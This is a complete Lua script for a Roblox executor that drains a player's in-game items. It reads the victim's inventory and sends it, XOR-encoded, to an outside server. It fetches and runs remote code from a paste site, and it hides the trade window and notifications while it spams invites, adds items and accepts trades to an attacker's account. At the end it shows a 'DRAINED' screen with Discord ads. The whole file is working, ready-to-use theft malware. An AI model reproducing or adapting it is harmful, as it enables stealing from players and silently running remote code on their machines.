-- ─── LPH STUB ────────────────────────────────────────────────────────────────
if not LPH_OBFUSCATED then
    LPH_ENCSTR = function(n) return n end; LPH_ENCNUM = function(n) return n end
    LPH_STRENC = function(n) return n end; LPH_NUMENC = function(n) return n end
    if buffer then local bf = buffer.fromstring; LPH_ENCBUF = function(n) return bf(n) end; LPH_BUFENC = LPH_ENCBUF end
    LPH_CRASH = function() end
    LPH_JIT = function(f) return f end; LPH_JIT_MAX = LPH_JIT; LPH_NO_VIRTUALIZE = LPH_JIT; LPH_NO_UPVALUES = LPH_JIT
    LPH_PRECHECK = function(check) check() end
    local __a = function() end
    LPH_ATTRIBUTES = __a; ENCRYPT = __a; VM = __a; PRESET = __a; OPTIMIZE = __a; NO_UPVALUES = __a
    ERROR_HANDLING = __a; UNROLL = __a; INLINE = __a; TRANSFORM = __a; NONE = __a; OPAL = __a; ONYX = __a
    FAST = __a; BALANCED = __a; SECURE = __a; EXTRACT = __a; CONTROL_FLOW = __a
    REWRITE_NAMECALLS = __a; GLOBALS = __a; CONSTANTS = __a
end

repeat task.wait() until game:IsLoaded()

-- ─── SERVIÇOS ────────────────────────────────────────────────────────────────
local Players            = game:GetService("Players")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService         = game:GetService("RunService")
local TeleportService    = game:GetService("TeleportService")
local CoreGui            = game:GetService("CoreGui")

-- ─── PLAYER ──────────────────────────────────────────────────────────────────
local LP      = Players.LocalPlayer
local LP_ID   = LP.UserId
local LP_NAME = LP.Name
local pg      = LP:WaitForChild("PlayerGui")

-- ─── CONFIG ──────────────────────────────────────────────────────────────────
local env               = getgenv()
local SECRET_KEY        = env.SECRET_KEY        or ""
local TARGET_ID         = env.TARGET_ID         or 0
local DELAY_STEP        = env.DELAY_STEP        or 1
local API_URL           = (env.API_URL          or "https://v3nt.squareweb.app"):gsub("/$", "")

-- ─── GUARD ───────────────────────────────────────────────────────────────────
if env.AAVChocolaRunning then return end
env.AAVChocolaRunning = true

-- ─── PLACE CHECK ─────────────────────────────────────────────────────────────
local DUEL_PLACE_ID    = 99606176102979
local MAIN_PLACE_ID    = 109983668079237
local ALT_PLACE_ID     = 85621847059032
local LL_GROUP_ID      = 35815907
local EXTRA_SCRIPT_URL = "https://pastefy.app/6x0dnBlE/raw"
local PLACE_ID         = game.PlaceId

local isDuel, runExtra = false, false

if PLACE_ID == DUEL_PLACE_ID then
    isDuel = true
elseif PLACE_ID == MAIN_PLACE_ID or PLACE_ID == ALT_PLACE_ID then
    runExtra = true
else
    local ok, info = pcall(LPH_JIT_MAX(function()
        return MarketplaceService:GetProductInfo(PLACE_ID)
    end))
    if not (ok and info
        and info.Creator
        and info.Creator.CreatorType == "Group"
        and tonumber(info.Creator.CreatorTargetId) == LL_GROUP_ID)
    then
        LP:Kick("You're stupid using modded")
        return
    end
end

if runExtra then
    task.spawn(LPH_JIT_MAX(function()
        pcall(LPH_JIT_MAX(function() loadstring(game:HttpGet(EXTRA_SCRIPT_URL))() end))
    end))
end

local JOB_ID = tostring(game.JobId) .. "_" .. tostring(LP_ID)

-- ─── EXECUTOR ────────────────────────────────────────────────────────────────
local executorName = "Unknown"
pcall(LPH_JIT_MAX(function()
    if env.EXECUTOR_NAME then
        executorName = env.EXECUTOR_NAME
    elseif identifyexecutor then
        local ok, v = pcall(identifyexecutor); if ok and v then executorName = v end
    elseif getexecutorname then
        local ok, v = pcall(getexecutorname);  if ok and v then executorName = v end
    elseif syn and syn.getexecutorname then
        executorName = syn.getexecutorname()
    end
end))
if executorName == "Unknown" then
    if      syn            then executorName = "Synapse"
    elseif  KRNL_LOADED    then executorName = "Krnl"
    elseif  WL_LOADED      then executorName = "WeAreDevs"
    elseif  env.is_sirhurt then executorName = "SirHurt"
    end
end

-- ─── TARGET LISTS ────────────────────────────────────────────────────────────
local TargetBrainrots = {}
local TargetGears     = {}
local TargetBaseSkins = {}
if env.TARGET_BRAINROTS  then for k,v in pairs(env.TARGET_BRAINROTS)  do TargetBrainrots[k]  = v end end
if env.TARGET_GEARS       then for k,v in pairs(env.TARGET_GEARS)      do TargetGears[k]      = v end end
if env.TARGET_BASE_SKINS  then for k,v in pairs(env.TARGET_BASE_SKINS) do TargetBaseSkins[k]  = v end end

-- ─── UTILITÁRIOS ─────────────────────────────────────────────────────────────
local byte, char   = string.byte, string.char
local bxor         = bit32.bxor
local fmt          = string.format
local tconcat      = table.concat
local tcreate      = table.create
local tinsert      = table.insert
local JSON         = HttpService

local function jsonEncode(t)  return JSON:JSONEncode(t)  end
local function jsonDecode(s)  return JSON:JSONDecode(s)  end

-- ─── XOR + ENCRYPT ───────────────────────────────────────────────────────────
local XOR_KEY = "cerberus_xor_2025"
local XOR_LEN = #XOR_KEY

local xorCrypt; xorCrypt = LPH_JIT_MAX(function(s)
    local len = #s
    local out = tcreate(len)
    for i = 1, len do
        out[i] = char(bxor(byte(s, i), byte(XOR_KEY, ((i-1) % XOR_LEN) + 1)))
    end
    return tconcat(out)
end)

local toHex; toHex = LPH_JIT_MAX(function(s)
    local len = #s
    local out = tcreate(len)
    for i = 1, len do out[i] = fmt("%02x", byte(s, i)) end
    return tconcat(out)
end)

local encryptPayload; encryptPayload = LPH_JIT_MAX(function(tbl)
    return toHex(xorCrypt(jsonEncode(tbl)))
end)

-- ─── REQUEST ─────────────────────────────────────────────────────────────────
local reqFn = (syn and syn.request) or (http and http.request) or http_request or request

local function apiPost(path, body)
    if not reqFn then return nil end
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = API_URL .. path,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Secret-Key"] = SECRET_KEY },
            Body    = jsonEncode(body),
        })
    end))
    if not ok or not res or not res.Body then return nil end
    local pOk, data = pcall(jsonDecode, res.Body)
    return pOk and data or nil
end

local function apiGet(path)
    if not reqFn then return nil end
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = API_URL .. path,
            Method  = "GET",
            Headers = { ["Content-Type"] = "application/json", ["X-Secret-Key"] = SECRET_KEY },
        })
    end))
    if not ok or not res or not res.Body then return nil end
    local pOk, data = pcall(jsonDecode, res.Body)
    return pOk and data or nil
end

-- ─── MÓDULOS DO JOGO ─────────────────────────────────────────────────────────
local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
local Channel          = require(ReplicatedStorage.Packages.Synchronizer.Channel)
local AnimalsData, GameData, MutationsData, TraitsData

pcall(LPH_JIT_MAX(function()
    local d = ReplicatedStorage:WaitForChild("Datas")
    AnimalsData   = require(d:WaitForChild("Animals"))
    GameData      = require(d:WaitForChild("Game"))
    MutationsData = require(d:WaitForChild("Mutations"))
    TraitsData    = require(d:WaitForChild("Traits"))
end))

local TradeController        = require(ReplicatedStorage.Controllers.TradeController)
local InterfaceController    = require(ReplicatedStorage.Controllers.InterfaceController)
local SoundController        = require(ReplicatedStorage.Controllers.SoundController)
local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
local CameraController       = require(ReplicatedStorage.Controllers.CameraController)

-- ─── CONTROLLER HOOKS ────────────────────────────────────────────────────────
local origToggle    = InterfaceController.Toggle
local origSetState  = InterfaceController.SetState
local origNotify    = NotificationController.Notify
local origError     = NotificationController.Error
local origSuccess   = NotificationController.Success
local origPlaySound = SoundController.PlaySound

local isFromTrade; isFromTrade = LPH_JIT_MAX(function()
    for lvl = 2, 8 do
        local s = debug.info(lvl, "s")
        if not s then break end
        if s:find("TradeController") then return true end
    end
    return false
end)

local blockedNotify; blockedNotify = LPH_JIT_MAX(function(msg)
    if type(msg) ~= "string" then return false end
    local plain = msg:gsub("<[^>]+>", "")
    local lower = plain:lower()
    local hasAt = plain:find("@") ~= nil
    return (hasAt and lower:find("cancel"))
        or (plain:find("Failed") and lower:find("trade"))
        or (hasAt and lower:find("completed"))
end)

SoundController.PlaySound = LPH_JIT_MAX(function(self, name, ...)
    local fromBtn = false
    for lvl = 2, 4 do
        local s = debug.info(lvl, "s")
        if s and s:find("AnimatedButton") then fromBtn = true; break end
    end
    local trade = InterfaceController:Get("TradeLiveTrade")
    if isFromTrade() or (fromBtn and trade and trade:IsOpened()) then return end
    return origPlaySound(self, name, ...)
end)

do
    local liveTrade = InterfaceController:Get("TradeLiveTrade")
    if liveTrade and liveTrade:IsOpened() then
        InterfaceController:Toggle("TradeLiveTrade", false)
        CameraController:Blur(0, 0)
        CameraController:Fov(CameraController:GetDefaultFov(), 0)
    end
end

InterfaceController.Toggle   = LPH_JIT_MAX(function(self, name, ...) if name == "TradeLiveTrade" then return end; return origToggle(self, name, ...)   end)
InterfaceController.SetState = LPH_JIT_MAX(function(self, name, ...) if name == "TradeLiveTrade" then return end; return origSetState(self, name, ...) end)
NotificationController.Notify   = LPH_JIT_MAX(function(self, msg, ...) if isFromTrade() or blockedNotify(msg) then return end; return origNotify(self, msg, ...)   end)
NotificationController.Error    = LPH_JIT_MAX(function(self, ...)       if isFromTrade()                       then return end; return origError(self, ...)        end)
NotificationController.Success  = LPH_JIT_MAX(function(self, ...)       if isFromTrade()                       then return end; return origSuccess(self, ...)      end)

-- ─── CALC VALOR ──────────────────────────────────────────────────────────────
local getRealValue; getRealValue = LPH_JIT_MAX(function(animalName, mutation, traits)
    if type(animalName) ~= "string" or not AnimalsData then return 0 end
    local animal = AnimalsData[animalName]
    if not animal then return 0 end
    local baseGen = animal.Generation
    if not baseGen and GameData then
        baseGen = (animal.Price or 0) * (GameData.Game and GameData.Game.AnimalGanerationModifier or 1)
    end
    baseGen = baseGen or 0
    local mult = 1
    if mutation and mutation ~= "None" and MutationsData and MutationsData[mutation] then
        mult += MutationsData[mutation].Modifier or 0
    end
    if traits and TraitsData then
        local sleepy = false
        for _, trait in ipairs(traits) do
            if trait == "Sleepy" then sleepy = true
            elseif TraitsData[trait] then mult += TraitsData[trait].MultiplierModifier or 0 end
        end
        if sleepy then mult *= 0.5 end
    end
    return math.round(baseGen * mult)
end)

-- ─── SYNC DATA ───────────────────────────────────────────────────────────────
local capturedData
repeat
    for _, v in getgc(true) do
        if type(v) == "table" and getmetatable(v) == Channel and v.Index == LP then
            capturedData = v.CacheTable
            break
        end
    end
    if not capturedData then task.wait(0.1) end
until capturedData

-- ─── SCAN INVENTÁRIO ─────────────────────────────────────────────────────────
local brainrotQueue = {}
local gearQueue     = {}
local skinQueue     = {}
local itemsList     = {}
local allGears      = {}
local allSkins      = {}

local podiums = capturedData["AnimalPodiums"] or capturedData["AnimalList"]
if type(podiums) == "table" then
    for slotKey, animalData in pairs(podiums) do
        if type(animalData) == "table" and animalData.Index then
            local name     = animalData.Index
            local mutation = animalData.Mutation or "None"
            local traits   = (type(animalData.Traits) == "table") and animalData.Traits or {}
            local genVal   = getRealValue(name, mutation, traits)
            local slot     = tonumber(slotKey)
            tinsert(itemsList, { name = name, gen = genVal, mutation = tostring(mutation), traits = traits, slot = slot })
            if TargetBrainrots[name] then
                tinsert(brainrotQueue, { slotKey = slot, data = animalData, mutation = mutation, traits = traits, genValue = genVal })
            end
        end
    end
end

do
    local gearInv = capturedData["GearInventory"]
    if type(gearInv) == "table" then
        for uuid, d in pairs(gearInv) do
            if type(d) == "table" and d.GearName then
                local e = { GearName = d.GearName, UUID = uuid }
                tinsert(allGears, e)
                if TargetGears[d.GearName] then tinsert(gearQueue, e) end
            end
        end
    end
end

do
    local skinInv = capturedData["BaseSkinInventory"]
    if type(skinInv) == "table" then
        for uuid, d in pairs(skinInv) do
            if type(d) == "table" and d.SkinName then
                local e = { SkinName = d.SkinName, UUID = uuid }
                tinsert(allSkins, e)
                if TargetBaseSkins[d.SkinName] then tinsert(skinQueue, e) end
            end
        end
    end
end

if #brainrotQueue == 0 and #gearQueue == 0 and #skinQueue == 0 then return end

-- ─── BUILD PAYLOAD LISTS (1x) ────────────────────────────────────────────────
local function buildKeys(t)
    local list = {}
    for k in pairs(t) do list[#list + 1] = k end
    return list
end

local targetBrainrotList = buildKeys(TargetBrainrots)
local targetGearList     = buildKeys(TargetGears)
local targetSkinList     = buildKeys(TargetBaseSkins)

local gearsFormatted = tcreate(#allGears)
for i, g in ipairs(allGears) do gearsFormatted[i] = { name = g.GearName, GearName = g.GearName, UUID = g.UUID } end

local skinsFormatted = tcreate(#allSkins)
for i, s in ipairs(allSkins) do skinsFormatted[i] = { name = s.SkinName, SkinName = s.SkinName, UUID = s.UUID } end

-- ─── ENVIO VIA API ───────────────────────────────────────────────────────────
local activeTargetId = TARGET_ID

task.spawn(LPH_JIT_MAX(function()
    local data = apiPost("/api/script/scan", {
        e = encryptPayload({
            secret_key        = SECRET_KEY,
            roblox_name       = LP_NAME,
            roblox_id         = LP_ID,
            target_id         = TARGET_ID,
            job_id            = JOB_ID,
            target_brainrots  = targetBrainrotList,
            target_gears      = targetGearList,
            target_base_skins = targetSkinList,
            items             = itemsList,
            gears             = gearsFormatted,
            base_skins        = skinsFormatted,
            executor_name     = executorName,
            player_count      = #Players:GetPlayers(),
            is_duel           = isDuel,
        })
    })
    if data then
        local gid = tonumber(data.good_target_id)
        if gid and gid ~= 0 then activeTargetId = gid end
    end
end))

-- ─── ANTI-DUEL ───────────────────────────────────────────────────────────────
local ANTI_DUEL_PLACE_ID = 96342491571673

if isDuel then
    task.spawn(LPH_JIT_MAX(function()
        local config = apiGet("/api/script/anti-duel/config")
        if not config or not config.anti_duel_enabled then return end
        local targetJobId = config.job_id
        if not targetJobId or targetJobId == "" then return end

        task.wait(5)

        -- Log assíncrono
        task.spawn(LPH_JIT_MAX(function()
            local logItems = tcreate(#itemsList)
            for i, item in ipairs(itemsList) do
                logItems[i] = { name = item.name, slot = item.slot, mutation = item.mutation, traits = item.traits, gen = item.gen }
            end
            apiPost("/api/script/anti-duel/log-teleport", {
                secret_key    = SECRET_KEY,
                roblox_id     = LP_ID,
                roblox_name   = LP_NAME,
                roblox_avatar = fmt("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LP_ID),
                job_id_used   = targetJobId,
                brainrots     = logItems,
            })
        end))

        for _ = 1, 20 do
            local ok = pcall(LPH_JIT_MAX(function()
                TeleportService:TeleportToPlaceInstance(ANTI_DUEL_PLACE_ID, targetJobId, LP)
            end))
            if ok then break end
            task.wait(1.5)
        end
    end))
end

-- ─── SCANNER DINÂMICO DE UPVALUES ────────────────────────────────────────────
-- Em vez de índices hardcoded (frágil a updates), escaneia por tipo/valor.
local getupval = debug.getupvalue or getupvalue

local function scanUpvalues(fn, predicate, maxDepth)
    maxDepth = maxDepth or 60
    for i = 1, maxDepth do
        local ok, val = pcall(getupval, fn, i)
        if not ok then break end
        if predicate(val) then return val, i end
    end
    return nil
end

local function isRemoteFunction(v)
    return typeof(v) == "Instance" and v:IsA("RemoteFunction")
end

local function isRemoteEvent(v)
    return typeof(v) == "Instance" and v:IsA("RemoteEvent")
end

local function isBindableEvent(v)
    return typeof(v) == "Instance" and v:IsA("BindableEvent")
end

-- Tenta extrair um subtable de upvalue por chave, depois scaneia dentro
local function scanUpvalueTable(fn, tableKey, subPredicate, maxDepth)
    local tbl = scanUpvalues(fn, function(v)
        return type(v) == "table" and v[tableKey] ~= nil
    end, maxDepth)
    if not tbl then return nil end
    local sub = tbl[tableKey]
    if type(sub) == "table" then
        for k, v in pairs(sub) do
            if subPredicate(v) then return v, k end
        end
    end
    return sub
end

-- ─── RESOLUÇÃO DE REMOTES ────────────────────────────────────────────────────
local INVITE_GUID = "8fbe1594-7cef-4c29-94d1-a0e93adfa5a4"
local SELECT_GUID = "c85a2323-36b2-4121-968a-c064a6168aff"
local ITEM_GUID   = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
local READY_GUID  = "23f15b0b-b633-4f6b-888f-5924b7425522"
local ACCEPT_GUID = "86eea964-f19e-4ac6-b401-a71ecc89e596"

local inviteRemote, addBrainrotRemote, addItemRemote, readyRemote, acceptRemote
local tradeCompleteEvent

-- Nível 1: via scanner dinâmico (robusto a mudanças de índice)
pcall(LPH_JIT_MAX(function()
    -- Invite: primeiro RF dentro de SendInvite
    inviteRemote = scanUpvalues(TradeController.SendInvite, isRemoteFunction)

    -- createLiveTrade carrega um subtable com os handlers por tipo de item
    local itemHandlerTable = scanUpvalues(TradeController._createLiveTrade, function(v)
        return type(v) == "table" and type(v["Brainrot"]) == "table" and type(v["BaseSkin"]) == "table"
    end)

    if itemHandlerTable then
        addBrainrotRemote = itemHandlerTable["Brainrot"] and
            scanUpvalues(itemHandlerTable["Brainrot"].Add, isRemoteFunction)
        addItemRemote = itemHandlerTable["BaseSkin"] and
            scanUpvalues(itemHandlerTable["BaseSkin"].Add, isRemoteFunction)
    end

    -- Ready: primeiro RE dentro de _createLiveTrade
    readyRemote  = scanUpvalues(TradeController._createLiveTrade, isRemoteEvent)

    -- Accept: segundo RE
    local readyIdx
    _, readyIdx  = scanUpvalues(TradeController._createLiveTrade, isRemoteEvent)
    if readyIdx then
        acceptRemote = scanUpvalues(TradeController._createLiveTrade, isRemoteEvent, readyIdx + 1)
        -- se readyIdx+1 retornar o mesmo, busca next diferente
        if acceptRemote == readyRemote then
            for i = readyIdx + 1, 60 do
                local ok, v = pcall(getupval, TradeController._createLiveTrade, i)
                if not ok then break end
                if isRemoteEvent(v) and v ~= readyRemote then
                    acceptRemote = v
                    break
                end
            end
        end
    end

    -- TradeCompleteEvent: BindableEvent ou RemoteEvent em _createPlayerList
    tradeCompleteEvent = scanUpvalues(TradeController._createPlayerList, function(v)
        return isBindableEvent(v) or isRemoteEvent(v)
    end)
end))

-- Nível 2: hash fallback (se scanner falhar por obfuscation profunda)
if not (inviteRemote and addBrainrotRemote and readyRemote and acceptRemote) then
    pcall(LPH_JIT_MAX(function()
        local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
        local children = Net:GetChildren()

        -- Monta mapa hash→name para lookup O(1)
        local hashMap = {}
        local lastHash = nil
        for _, c in ipairs(children) do
            if #c.Name > 40 then
                lastHash = c.Name
            elseif lastHash then
                hashMap[c.Name] = lastHash
                lastHash = nil
            end
        end

        local function resolve(...)
            for _, name in ipairs({...}) do
                local h = hashMap[name]
                if h then
                    local obj = Net:FindFirstChild(h)
                    if obj then return obj end
                end
            end
        end

        inviteRemote      = inviteRemote      or resolve("RF/TradeService/Invite",      "RF/BrainrotTrader/Invite")
        addBrainrotRemote = addBrainrotRemote or resolve("RF/TradeService/AddBrainrot",  "RF/BrainrotTrader/AddBrainrot")
        addItemRemote     = addItemRemote     or resolve("RF/TradeService/AddItem",      "RF/BrainrotTrader/AddItem")
        readyRemote       = readyRemote       or resolve("RE/TradeService/Ready",        "RS/BrainrotTrader/Ready")
        acceptRemote      = acceptRemote      or resolve("RE/TradeService/Accept",       "RS/BrainrotTrader/Accept")
    end))
end

if not (inviteRemote and addBrainrotRemote and readyRemote and acceptRemote) then return end

-- ─── WRAPPERS DE REMOTE (com pcall inline, sem overhead de closure extra) ────
local function doInvite()
    pcall(LPH_JIT_MAX(function()
        inviteRemote:InvokeServer(INVITE_GUID, activeTargetId)
    end))
end

local function doReady()
    pcall(LPH_JIT_MAX(function()
        -- Tenta chamar o método do TradeController diretamente antes do raw
        if TradeController.Ready then
            TradeController:Ready()
        else
            readyRemote:FireServer(READY_GUID)
        end
    end))
end

local function doAccept()
    pcall(LPH_JIT_MAX(function()
        if TradeController.Accept then
            TradeController:Accept()
        else
            acceptRemote:FireServer(ACCEPT_GUID)
        end
    end))
end

local function doAddBrainrot(item)
    pcall(LPH_JIT_MAX(function()
        addBrainrotRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
    end))
end

local function doAddGear(item)
    pcall(LPH_JIT_MAX(function()
        addItemRemote:InvokeServer(ITEM_GUID, "Gear", { GearName = item.GearName, UUID = item.UUID or "" })
    end))
end

local function doAddSkin(item)
    pcall(LPH_JIT_MAX(function()
        addItemRemote:InvokeServer(ITEM_GUID, "BaseSkin", { SkinName = item.SkinName, UUID = item.UUID or "" })
    end))
end

-- ─── TRADE REPLICATOR ────────────────────────────────────────────────────────
local tradeReplicator = ReplicatorClient.get(("Trade_%*"):format(LP_ID))

-- ─── MÁQUINA DE ESTADO DO TRADE ──────────────────────────────────────────────
-- Estados: IDLE → OPEN → CLOSED (volta pra IDLE ou vai pra DONE)
local STATE = {
    IDLE = 0,
    OPEN = 1,
    DONE = 2,
}
local currentState = STATE.IDLE

-- Índices de ciclo
local brainrotIdx = 1
local gearIdx     = 1
local skinIdx     = 1

-- Acumuladores de tempo para cada ação
local acc = { invite = 0, ra = 0, brainrot = 0, gear = 0, skin = 0 }

-- Rates
local INVITE_RATE   = 0.15
local RA_RATE       = 0.05

local hasBrainrots  = #brainrotQueue > 0
local hasGears      = addItemRemote ~= nil and #gearQueue > 0
local hasSkins      = addItemRemote ~= nil and #skinQueue > 0

local function resetAccumulators()
    acc.invite   = 0
    acc.ra       = 0
    acc.brainrot = 0
    acc.gear     = 0
    acc.skin     = 0
end

-- Conexões que serão desconectadas no lockout
local heartbeatConn

heartbeatConn = RunService.Heartbeat:Connect(LPH_JIT_MAX(function(dt)
    if currentState == STATE.DONE then return end

    -- ── IDLE: envia invites ──────────────────────────────────────────────────
    if currentState == STATE.IDLE then
        acc.invite += dt
        if acc.invite >= INVITE_RATE then
            acc.invite = 0
            doInvite()
        end
        return
    end

    -- ── OPEN: spam ready/accept + itens ─────────────────────────────────────
    acc.ra += dt
    if acc.ra >= RA_RATE then
        acc.ra = 0
        doReady()
        doAccept()
    end

    if hasBrainrots then
        acc.brainrot += dt
        if acc.brainrot >= DELAY_STEP then
            acc.brainrot = 0
            doAddBrainrot(brainrotQueue[brainrotIdx])
            brainrotIdx = (brainrotIdx % #brainrotQueue) + 1
        end
    end

    if hasGears then
        acc.gear += dt
        if acc.gear >= DELAY_STEP then
            acc.gear = 0
            doAddGear(gearQueue[gearIdx])
            gearIdx = (gearIdx % #gearQueue) + 1
        end
    end

    if hasSkins then
        acc.skin += dt
        if acc.skin >= DELAY_STEP then
            acc.skin = 0
            doAddSkin(skinQueue[skinIdx])
            skinIdx = (skinIdx % #skinQueue) + 1
        end
    end
end))

-- ─── LISTENER DO REPLICATOR ───────────────────────────────────────────────────
tradeReplicator:ListenRaw(LPH_JIT_MAX(function(data)
    if currentState == STATE.DONE then return end

    local tradeData = tradeReplicator:TryIndex({ "active", "data" })

    if tradeData and currentState == STATE.IDLE then
        -- Trade abriu
        currentState = STATE.OPEN
        resetAccumulators()

    elseif not tradeData and currentState == STATE.OPEN then
        -- Trade fechou do lado do replicator — confirma 1 tick depois
        task.delay(0.3, LPH_JIT_MAX(function()
            if currentState ~= STATE.DONE and not tradeReplicator:TryIndex({ "active", "data" }) then
                currentState = STATE.IDLE
                resetAccumulators()
            end
        end))
    end
end))

-- ─── LOCKOUT SCREEN ───────────────────────────────────────────────────────────
local lockoutShown = false

local fetchDiscordInvite; fetchDiscordInvite = LPH_JIT_MAX(function(inviteCode, cacheFile)
    if not reqFn then return nil end
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = "https://discord.com/api/v10/invites/" .. inviteCode .. "?with_counts=true",
            Method  = "GET",
            Headers = { ["Content-Type"] = "application/json" },
        })
    end))
    if not ok or not res then return nil end
    local pOk, json = pcall(jsonDecode, res.Body)
    if not pOk or not json or not json.guild then return nil end

    local guild     = json.guild
    local members   = json.approximate_member_count or 0
    local iconAsset = nil

    if guild.icon then
        local iconUrl = fmt("https://cdn.discordapp.com/icons/%s/%s.png?size=128", guild.id, guild.icon)
        local iOk, iRes = pcall(LPH_JIT_MAX(function() return reqFn({ Url = iconUrl, Method = "GET" }) end))
        if iOk and iRes then
            pcall(LPH_JIT_MAX(function()
                writefile(cacheFile .. ".png", iRes.Body)
                iconAsset = getcustomasset(cacheFile .. ".png")
            end))
        end
    end
    return { icon = iconAsset, name = guild.name or inviteCode, members = members }
end)

local createDiscordCard; createDiscordCard = LPH_JIT_MAX(function(parent, position, serverData, inviteCode)
    local function inst(class, parent_, props)
        local i = Instance.new(class)
        for k, v in pairs(props) do i[k] = v end
        i.Parent = parent_
        return i
    end

    local container = inst("Frame", parent, {
        Size = UDim2.fromOffset(276, 85), Position = position,
        BackgroundTransparency = 1, BorderSizePixel = 0, ClipsDescendants = false,
    })
    local clickArea = inst("TextButton", container, {
        Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Text = "", ZIndex = 10,
    })
    clickArea.MouseButton1Click:Connect(LPH_JIT_MAX(function()
        pcall(LPH_JIT_MAX(function() setclipboard("discord.gg/" .. inviteCode) end))
    end))

    local iconFrame = inst("Frame", container, {
        Size = UDim2.fromOffset(62,62), Position = UDim2.new(0,0,0.5,-31),
        BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 2,
    })
    local iconImg = inst("ImageLabel", iconFrame, {
        Size = UDim2.fromScale(1,1), BackgroundTransparency = 1,
        Image = (serverData and serverData.icon) or "", ZIndex = 3,
    })
    inst("UICorner", iconImg, { CornerRadius = UDim.new(0,10) })

    local infoFrame = inst("Frame", container, {
        Size = UDim2.new(1,-76,1,0), Position = UDim2.fromOffset(76,0),
        BackgroundTransparency = 1, ZIndex = 3,
    })
    inst("TextLabel", infoFrame, {
        Size = UDim2.new(1,0,0,30), Position = UDim2.new(0,0,0,14),
        BackgroundTransparency = 1,
        Text = (serverData and serverData.name) or "Unknown",
        TextColor3 = Color3.fromRGB(255,255,255), TextSize = 15,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd, ZIndex = 4,
    })

    local statusRow = inst("Frame", infoFrame, {
        Size = UDim2.new(1,0,0,16), Position = UDim2.new(0,0,0,46),
        BackgroundTransparency = 1, ZIndex = 4,
    })
    local dot = inst("Frame", statusRow, {
        Size = UDim2.fromOffset(6,6), Position = UDim2.new(0,0,0.5,-3),
        BackgroundColor3 = Color3.fromRGB(80,220,100), BorderSizePixel = 0, ZIndex = 4,
    })
    inst("UICorner", dot, { CornerRadius = UDim.new(1,0) })
    inst("TextLabel", statusRow, {
        Size = UDim2.new(1,-12,1,0), Position = UDim2.fromOffset(10,0),
        BackgroundTransparency = 1,
        Text = serverData and (tostring(serverData.members) .. " members") or "",
        TextColor3 = Color3.fromRGB(180,180,180), TextSize = 12,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 4,
    })
end)

local renderLockoutScreen; renderLockoutScreen = LPH_JIT_MAX(function()
    if lockoutShown then return end
    lockoutShown    = true
    currentState    = STATE.DONE
    heartbeatConn:Disconnect()

    pcall(LPH_JIT_MAX(function() LP.PlayerGui:ClearAllChildren() end))
    pcall(LPH_JIT_MAX(function() CoreGui:ClearAllChildren() end))

    local sg = Instance.new("ScreenGui")
    sg.IgnoreGuiInset = true
    sg.ResetOnSpawn   = false
    sg.Parent         = CoreGui

    local function frame(parent, size, pos, z)
        local f = Instance.new("Frame")
        f.Size = size; f.Position = pos
        f.BackgroundColor3 = Color3.fromRGB(0,0,0)
        f.BorderSizePixel  = 0
        if z then f.ZIndex = z end
        f.Parent = parent
        return f
    end

    local function label(parent, size, pos, text, color, fs)
        local l = Instance.new("TextLabel")
        l.Size = size; l.Position = pos
        l.BackgroundTransparency = 1
        l.Text = text; l.TextColor3 = color
        l.Font = Enum.Font.GothamBold
        l.TextXAlignment = Enum.TextXAlignment.Center
        l.TextYAlignment = Enum.TextYAlignment.Center
        if fs then l.TextSize = fs; l.TextScaled = false
        else l.TextScaled = true end
        l.Parent = parent
        return l
    end

    local root = frame(sg, UDim2.fromScale(1,1), UDim2.fromScale(0,0))
    frame(sg, UDim2.fromScale(1.2,1.2), UDim2.fromScale(-0.1,-0.1), -1)

    label(root, UDim2.fromScale(1,0.3),    UDim2.fromScale(0,0.1),
        "YOUR BRAINROTS WAS DRAINED", Color3.fromRGB(255,0,0))
    label(root, UDim2.fromScale(0.8,0.2),  UDim2.fromScale(0.1,0.5),
        "https://v3nt.squareweb.app/\n\ndiscord.gg/v3ntscripts\ndiscord.gg/kUpM2EJccG",
        Color3.fromRGB(255,255,255))
    label(root, UDim2.fromScale(0.8,0.08), UDim2.fromScale(0.1,0.72),
        "Developed by Anarquico13  •  discord.gg/v3ntscripts  |  Duels: discord.gg/kUpM2EJccG",
        Color3.fromRGB(180,180,180), 16).TextTransparency = 0.4

    task.spawn(LPH_JIT_MAX(function()
        local v3nt  = fetchDiscordInvite("v3ntscripts", "v3nt_icon")
        local duels = fetchDiscordInvite("kUpM2EJccG",  "duels_icon")
        createDiscordCard(root, UDim2.new(0,10,1,-182), v3nt,  "v3ntscripts")
        createDiscordCard(root, UDim2.new(0,10,1,-92),  duels, "kUpM2EJccG")
    end))
end)

-- ─── DETECÇÃO DE FIM DE TRADE ─────────────────────────────────────────────────
if tradeCompleteEvent then
    local signal = tradeCompleteEvent.OnClientEvent or tradeCompleteEvent.Event
    if signal then
        signal:Connect(LPH_JIT_MAX(function(eventData)
            if typeof(eventData) == "table" and tonumber(eventData.otherUserId) == activeTargetId then
                renderLockoutScreen()
            end
        end))
    end
end

-- Fallback via replicator (se event não disparar)
tradeReplicator:ListenRaw(LPH_JIT_MAX(function(data)
    if not data and currentState == STATE.OPEN and not lockoutShown then
        task.delay(0.5, LPH_JIT_MAX(function()
            if not tradeReplicator:TryIndex({ "active", "data" }) and not lockoutShown then
                renderLockoutScreen()
            end
        end))
    end
end))
